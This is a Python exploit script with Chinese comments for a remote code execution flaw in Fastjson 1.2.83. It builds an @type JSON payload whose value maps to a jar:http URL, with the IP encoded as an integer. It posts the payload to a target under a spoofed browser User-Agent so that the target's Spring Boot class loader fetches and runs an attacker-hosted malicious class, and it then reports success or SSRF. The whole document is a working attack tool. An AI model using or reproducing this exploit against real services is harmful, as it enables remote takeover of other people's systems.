#!/usr/bin/env python3
"""
Fastjson 1.2.83 @JSONType RCE Exploit

用法:
  python3 exp.py -u <TARGET_URL> -poc <POC_URL>

参数:
  -u    目标接口地址 (接收JSON的接口)
  -poc  恶意class文件的HTTP地址 (需自己托管)

示例:
  python3 exp.py -u http://127.0.0.1:18080/parse -poc http://127.0.0.1:19090/probe

原理:
  Fastjson checkAutoType 中 @JSONType 探测路径:
    typeName.replace('.', '/') + ".class" → getResourceAsStream()
  构造 @type 值使替换后变成 jar:http://IP:PORT/path!/POC.class
  Spring Boot LaunchedURLClassLoader 远程加载执行
"""
import sys
import json
import struct
import socket
import argparse
import urllib.request
from urllib.parse import urlparse


def url_to_payload(poc_url):
    """
    将 POC URL 转为 Fastjson payload 中的 @type 值

    例: http://127.0.0.1:19090/probe
      → jar URL: jar:http://127.0.0.1:19090/probe!/POC.class
      → @type 值: jar:http:..2130706433:19090.probe!.POC
         (所有 / 变成 . ，IP变整数避免包含.)
    """
    parsed = urlparse(poc_url)
    host = parsed.hostname
    port = parsed.port or 80
    path = parsed.path  # e.g. /probe

    # IP 转整数（因为 . 会被替换为 /）
    ip_int = struct.unpack("!I", socket.inet_aton(host))[0]

    # path 中的 / 替换为 .
    # /probe → .probe
    path_dotted = path.replace("/", ".")

    # 最终 @type: jar:http:..INT_IP:PORT.path!.POC
    type_value = f"jar:http:..{ip_int}:{port}{path_dotted}!.POC"
    return type_value


def main():
    parser = argparse.ArgumentParser(description="Fastjson 1.2.83 @JSONType RCE Exploit")
    parser.add_argument("-u", required=True, help="目标接口URL")
    parser.add_argument("-poc", required=True, help="恶意文件的HTTP地址 (需提前托管)")
    args = parser.parse_args()

    type_value = url_to_payload(args.poc)
    payload = json.dumps({"@type": type_value, "x": 1})

    print(f"[*] Target:  {args.u}")
    print(f"[*] POC URL: {args.poc}")
    print(f"[*] Payload: {payload}")
    print()

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

    print("[*] Sending...")
    try:
        req = urllib.request.Request(args.u, data=payload.encode(), headers=headers)
        r = urllib.request.urlopen(req, timeout=30)
        body = r.read().decode()
        print(f"[*] Response: {r.status}")
        print(f"[*] Body: {body[:500]}")
        if '"ok":true' in body:
            print(f"\n[+] SUCCESS! Remote class loaded and executed.")
        else:
            print(f"\n[-] Class not loaded. Check conditions.")
    except urllib.error.HTTPError as e:
        print(f"[*] HTTP {e.code}: {e.read().decode()[:300]}")
    except Exception as e:
        print(f"[*] Error: {e}")
        print("[*] If POC server received GET request, SSRF confirmed.")


if __name__ == "__main__":
    main()
